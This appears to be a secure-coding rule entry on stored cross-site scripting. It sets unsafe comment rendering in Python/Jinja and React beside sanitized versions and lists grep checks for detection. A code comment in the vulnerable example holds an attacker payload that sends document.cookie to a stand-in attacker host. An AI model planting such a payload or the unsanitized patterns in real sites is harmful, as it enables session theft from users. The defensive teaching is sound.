---
id: frontend-xss-stored
title: Stored (Persistent) Cross-Site Scripting (XSS)
severity: critical
tags: [xss, frontend, injection, stored, persistent, browser-security]
taxonomy: security/frontend/xss-stored
references:
  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting
  - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
---

# Stored (Persistent) Cross-Site Scripting (XSS)

## Description

Stored XSS occurs when malicious scripts are permanently stored in the database (comments, profiles, messages) and served to every user who views the content. Unlike reflected XSS, no phishing is required — every user who views the page is attacked. Can be used for account takeover, cryptojacking, and credential harvesting at scale.

## Vulnerable Pattern

```python
# BAD — user comment stored and rendered without sanitization
@app.post("/comments")
def create_comment(body: str, user=Depends(get_current_user)):
    comment = Comment(body=body, user_id=user.id)
    db.add(comment)
    db.commit()

# Template rendering the stored comment directly:
# {{ comment.body | safe }}  ← the |safe filter disables autoescaping
# Attacker stores: <script>new Image().src='https://attacker.com/?c='+document.cookie</script>
```

```javascript
// BAD — React: using dangerouslySetInnerHTML with stored content
function CommentDisplay({ comment }) {
    return <div dangerouslySetInnerHTML={{ __html: comment.body }} />;
    // If comment.body contains <script> tags, XSS executes
}
```

## Secure Pattern

```python
import bleach  # HTML sanitization library

ALLOWED_TAGS = ["b", "i", "u", "em", "strong", "p", "br"]
ALLOWED_ATTRS = {}

@app.post("/comments")
def create_comment(body: str, user=Depends(get_current_user)):
    # Sanitize HTML — strip all tags not in allowlist
    clean_body = bleach.clean(body, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)
    comment = Comment(body=clean_body, user_id=user.id)
    db.add(comment)
    db.commit()

# Template: use {{ comment.body }} (auto-escaped) NOT {{ comment.body | safe }}
```

```javascript
// GOOD — React: use textContent or sanitize with DOMPurify
import DOMPurify from "dompurify";

function CommentDisplay({ comment }) {
    const cleanHTML = DOMPurify.sanitize(comment.body, { ALLOWED_TAGS: ["b", "i", "p"] });
    return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
```

## Checks to Generate

- Grep for `| safe` in Jinja2/Django templates applied to user-generated content fields.
- Flag `dangerouslySetInnerHTML` in React without DOMPurify sanitization.
- Grep for `.innerHTML = ` with content from API responses (stored user data).
- Flag missing HTML sanitization on input fields: comment, bio, description, message body.
- Check for missing Content-Security-Policy header with `script-src` directive.
- Grep for rich text editor integrations without output sanitization on storage.
